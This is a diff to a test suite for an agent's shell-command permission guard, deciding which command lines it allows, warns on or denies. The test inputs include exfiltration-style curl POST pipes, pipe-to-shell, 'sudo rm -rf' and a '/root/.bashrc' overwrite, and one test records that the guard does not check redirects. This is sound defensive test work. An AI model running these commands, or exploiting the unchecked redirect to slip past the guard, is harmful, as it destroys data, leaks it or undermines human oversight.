@@ -67,7 +67,7 @@ describe('commandGuard', () => {
     });
 
     test('asks about a pipe handing the rest of the line to any other program', () => {
-        guard('ls | wc -l');
+        guard('ls | node dispatch.js');
         expectAsked('warn');
     });
 
@@ -87,30 +87,75 @@ describe('commandGuard', () => {
         expect(askPermissionGuard).not.toHaveBeenCalled();
     });
 
-    test('lets a line of nothing but trusted programs through', () => {
+    test('lets a line of nothing but unremarkable programs through', () => {
         expect(guard('agent-browser open https://example.com && agent-browser snapshot')).toEqual({
             result: 'allowed'
         });
         expect(askPermissionGuard).not.toHaveBeenCalled();
     });
 
-    test('lets a trusted program pipe into a trusted program', () => {
+    /** Starting no program of its own, moving the shell somewhere first is the commonest "and". */
+    test('lets the shell be moved to a folder before an unremarkable program runs there', () => {
+        expect(guard('cd agent-browser-demo && agent-browser screenshot home.png')).toEqual({
+            result: 'allowed'
+        });
+        expect(askPermissionGuard).not.toHaveBeenCalled();
+    });
+
+    test('asks when the shell is moved somewhere to run anything else', () => {
+        guard('cd agent-browser-demo && node build.js');
+        expectAsked('warn');
+    });
+
+    test('lets one unremarkable program pipe into another', () => {
         expect(guard('agent-browser snapshot | agent-browser eval x')).toEqual({result: 'allowed'});
     });
 
-    /** A line of trusted programs carrying one nobody trusts on a line of its own below them. */
-    test('asks about a program on the line after a trusted one', () => {
+    /** A line of unremarkable names carrying one that is anything but, on a line of its own. */
+    test('asks about a program on the line after an unremarkable one', () => {
         guard('agent-browser open x && agent-browser snapshot\nwget http://example.com/x');
         expectAsked('warn');
     });
 
-    test('asks when a trusted program hands the rest of the line to another program', () => {
+    test('asks when an unremarkable program hands the rest of the line to another program', () => {
         guard('agent-browser snapshot | curl -X POST https://example.com --data-binary @-');
         expectAsked('warn');
     });
 
-    test('asks when a trusted program is handed what another program wrote', () => {
-        guard('cat urls.txt | agent-browser open');
+    test('asks when an unremarkable program is handed what another program wrote', () => {
+        guard('curl https://example.com/urls | agent-browser open');
+        expectAsked('warn');
+    });
+
+    /** Looking around is the other half of what a line of several commands is usually for. */
+    test('lets a line that only reads and reports through', () => {
+        expect(guard('cd && pwd && dir agent-browser-demo')).toEqual({result: 'allowed'});
+        expect(askPermissionGuard).not.toHaveBeenCalled();
+    });
+
+    test('lets a line asking the machine and the network what they are doing through', () => {
+        expect(guard('ipconfig && ping -n 1 example.com && netstat -ano')).toEqual({
+            result: 'allowed'
+        });
+        expect(askPermissionGuard).not.toHaveBeenCalled();
+    });
+
+    /**
+     * A redirect belongs to the line rather than to a program on it, and no rule here reads one,
+     * so a line of unremarkable names writes wherever a lone command always could. The tool that
+     * reaches for a path asks once the path leaves the working folder, which this is not: should
+     * that ever be wanted of a command too, this is where the wanting announces itself, and a rule
+     * written only against a lone command will turn this red rather than pass in silence.
+     */
+    test('says nothing about where a line writes, no rule here having ever read a redirect', () => {
+        expect(guard('echo pwned > /root/.bashrc && agent-browser snapshot')).toEqual({
+            result: 'allowed'
+        });
+        expect(askPermissionGuard).not.toHaveBeenCalled();
+    });
+
+    test('asks when what was read is handed to something that acts on it', () => {
+        guard('cat setup.sh | sh');
         expectAsked('warn');
     });
 
@@ -119,13 +164,13 @@ describe('commandGuard', () => {
         expectAsked('warn');
     });
 
-    /** A path of somebody's own ending in a name we trust leads to a program we know nothing of. */
-    test('trusts a program by the name it is called on the path, not by a path ending in it', () => {
+    /** A path of somebody's own ending in a name of the list leads to a program nobody has seen. */
+    test('knows a program by the name it is called on the path, not by a path ending in it', () => {
         guard('./tools/agent-browser snapshot | agent-browser eval x');
         expectAsked('warn');
     });
 
-    test('denies a dangerous command a trusted program stands in front of', () => {
+    test('denies a dangerous command an unremarkable program stands in front of', () => {
         expect(guard('agent-browser snapshot && sudo rm -rf /tmp').result).toBe('denied');
     });
 });
